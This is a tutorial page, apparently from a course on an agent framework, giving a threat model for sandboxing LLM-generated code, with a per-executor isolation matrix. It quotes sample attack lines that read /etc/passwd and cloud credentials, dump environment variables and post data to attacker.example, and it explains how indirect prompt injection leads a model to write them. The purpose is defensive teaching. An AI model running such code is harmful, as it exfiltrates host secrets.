---
module: 12_CodeExecution
page: 02A_SandboxBypassClasses
title: Sandbox bypass classes — the executor-agnostic threat model
estimated_minutes: 25
prereqs: [12_CodeExecution/02]
concepts: [threat model, filesystem access, environment leakage, network egress, privilege escalation, prompt injection vector]
icon: ⚠️
in_production: true
detours_suggested: []
---

[← Prev: 12_CodeExecution/02_UnsafeLocalCodeExecutor]  [↑ Map](../../MAP.md)  [Next: 12_CodeExecution/03_BuiltInCodeExecutor →]

You are here: 🗺 Runtime Track ▸ 12 Code Execution ▸ 02A Sandbox Bypass Classes

# ⚠️ Sandbox bypass classes — name the threats once, refer back forever

The six executors look very different. Their threat surfaces don't. There is a small, finite set of dimensions on which any code-execution sandbox can fail, and naming them once lets pages 02-06 forward-link instead of re-stating. Read this page once; treat it as the vocabulary for the rest of the module.

## Why an executor-agnostic page

Each executor's defaults are different, but the questions you ask of them are the same:

1. Can the LLM-generated code read files on the host?
2. Can it read host environment variables?
3. Can it open outbound network connections?
4. Can it escalate privileges inside the sandbox or escape it entirely?

The matrix in `_figures/bypass_matrix.txt` is a one-screen answer per executor. The four sections below are the *why* behind each row.

## The four threat classes

### (a) Filesystem access

The model writes `open("/etc/passwd").read()`, `pathlib.Path.home().rglob("*")`, or `open(os.path.expanduser("~/.aws/credentials")).read()`. The defense is keeping the code blind to your host filesystem.

Defended by: chroot, read-only root mounts, container fs isolation, restricted globals. NOT defended by: spawning a child process, running as a non-root user (a non-root user can still read its own home directory and a lot of `/etc`), `try/except` around `open()` (the model just writes the call without a try/except).

Per-executor verdict (see matrix): UnsafeLocal **NO**; BuiltIn **YES** (Google-managed); VertexAi **YES**; Container **DEPENDS** on your image and mounts; GKE-job **YES** by default (`read_only_root_filesystem=True` at `gke_code_executor.py:285`); AgentEngineSandbox **YES**.

### (b) Environment leakage

`print(os.environ)` returns the entire host env block to the model. For an agent process, that block typically holds GCP creds (`GOOGLE_APPLICATION_CREDENTIALS`), AWS keys, database URLs, API tokens — anything you ship via `.env` or your orchestrator. The model then ships them downstream as text.

Defended by: env-scrubbing before exec, container env-isolation (the container's env is what you set, not the host's), explicit allowlist. NOT defended by: "I didn't put secrets in env" (your runtime did — ADC and most cloud SDKs read env).

Per-executor verdict: UnsafeLocal **NO** (`spawn` inherits the env block); BuiltIn **YES**; VertexAi **YES**; Container **DEPENDS** (your `docker run -e ...` decides what gets in); GKE-job **YES** (container env is set by the job manifest, host env not inherited); AgentEngineSandbox **YES**.

### (c) Network egress

`requests.post("https://attacker.example/", data=...)` ships the snippet's output to a third party. Combined with (a) or (b), this is one-call full credential exfiltration.

Defended by: network namespace isolation (no network at all), `NetworkPolicy` (k8s deny-by-default + allowlist), sandbox-managed egress policy, host firewall rules. NOT defended by: "we only call our own services" (the model writes whatever URL).

Per-executor verdict: UnsafeLocal **❌ FULL** egress (the most dangerous default in ADK); BuiltIn **✅ NONE** (Google-managed sandbox has no network); VertexAi **◐ PARTIAL** (vendor-managed allowlist, not yours to extend); Container **DEPENDS** (Docker daemon defaults to bridge network with full outbound); GKE-job **DEPENDS** (no `NetworkPolicy` by default — you must apply one); AgentEngineSandbox **◐ PARTIAL** (vendor-managed).

### (d) Privilege escalation within / out of sandbox

Once inside the sandbox: can the code `setuid`, exploit a kernel CVE, mount a host volume, or otherwise get more privilege than it started with? In a shared-kernel container, "escape" usually means breaking the kernel-syscall sandbox; in a VM-isolated runtime (gVisor, Firecracker), the bar is much higher.

Defended by: `run_as_non_root`, `allow_privilege_escalation=False`, dropped capabilities, gVisor or Firecracker runtime, seccomp profiles. NOT defended by: just running unprivileged on a stock kernel (CVE-2022-0185 and friends are real).

Per-executor verdict: UnsafeLocal **N/A** (no sandbox to escape — the "host" is your process); BuiltIn **YES** (Google-managed); VertexAi **YES**; Container **DEPENDS** (your `docker run` flags); GKE-job **YES** by default (`run_as_non_root=True`, `allow_privilege_escalation=False`, `capabilities=drop(["ALL"])`, `runtime_class_name="gvisor"` — all at `gke_code_executor.py:281-307`); AgentEngineSandbox **YES**.

## The matrix

```
                         |  Filesystem |  Env vars  |  Network  |  Priv-esc
                         |  isolation  |  isolation |  egress   |  defense
-------------------------+-------------+------------+-----------+----------
 UnsafeLocal             |   ❌ NO     |   ❌ NO    |  ❌ FULL  |   N/A
 BuiltIn (Gemini)        |   ✅ YES    |   ✅ YES   |  ✅ NONE  |   ✅ YES
 VertexAi Code Exec      |   ✅ YES    |   ✅ YES   |  ◐ PART. |   ✅ YES
 Container (yours)       |   ◐ DEP.   |   ◐ DEP.  |  ◐ DEP.  |   ◐ DEP.
 GKE job (default)       |   ✅ YES    |   ✅ YES   |  ◐ DEP.  |   ✅ YES (gVisor)
 AgentEngineSandbox      |   ✅ YES    |   ✅ YES   |  ◐ PART. |   ✅ YES
```

(Also lives at `_figures/bypass_matrix.txt`.)

## What "DEPENDS" actually means

For `ContainerCodeExecutor` and `GkeCodeExecutor` (the executor_type=job mode), the framework gives you a hardened *seam*: a container boundary, a job manifest. **You own the rest.** Wrong base image with `apt-get install -y openssh-client` baked in? You handed the model SSH. Misconfigured Docker daemon running with `--privileged`? Container isolation collapses entirely — you might as well be on UnsafeLocal. No `NetworkPolicy` applied to the GKE namespace? Egress is open even though every other dimension is locked down.

"DEPENDS" is a TODO, not a verdict. The framework's contract is "I gave you the seam"; your contract is "I configured it." Until you've replaced every `DEPENDS` cell with `YES` or `NO` (in writing, in your runbook), you don't know your threat posture.

## The prompt-injection multiplier

Every threat class above gets weaponized faster when the code is LLM-generated and the LLM is taking instructions from data it didn't author. Indirect prompt injection — instructions hidden in retrieved documents, tool outputs, user uploads — turns "would the LLM ever write `open('/etc/passwd')`?" into "is there any document anywhere in your pipeline that could convince it to?"

A `VertexAiCodeExecutor` defends (a)(b)(c)(d) but cannot stop the model from emitting code that exhausts its own egress allowlist, dumps the sandbox's `/tmp`, or returns a poisoned answer crafted by the attacker. Sandbox isolation is necessary; sandbox isolation is not sufficient. Cross-link to `[[16_ProductionSecurity/02_PromptInjectionDefense]]` for the upstream story and `[[16_ProductionSecurity/05_GuardrailsCookbook]]` for the callback-layer mitigations.

> ❓ **Ask the student:** "Your executor is `ContainerCodeExecutor`. What's the ONE flag on your Docker daemon that would collapse every defense (a)-(d) simultaneously?" *(Expected: `--privileged`. It disables namespacing, capability drops, and seccomp in one move.)*

> ❓ **Ask the student:** "If your executor is `BuiltInCodeExecutor` and you're confident all four bypass classes are defended, what's the residual risk?" *(Expected: the model can still emit poisoned text in the result, which becomes input to the next turn — prompt injection moves to the output stage. Sandbox isolation doesn't make the LLM's output trustworthy.)*

> 🚀 **In Production**
>
> Threat-modeling code execution is not optional. For each executor your team
> ships, fill in the matrix above against your actual config. If a cell says
> `DEPENDS`, it must say `YES` or `NO` (in writing, in your runbook) before
> launch. A `DEPENDS` cell in production is a vulnerability whose presence
> you've documented but whose state you haven't.

---

[← Prev: 12_CodeExecution/02_UnsafeLocalCodeExecutor]  [↑ Map](../../MAP.md)  [Next: 12_CodeExecution/03_BuiltInCodeExecutor →]
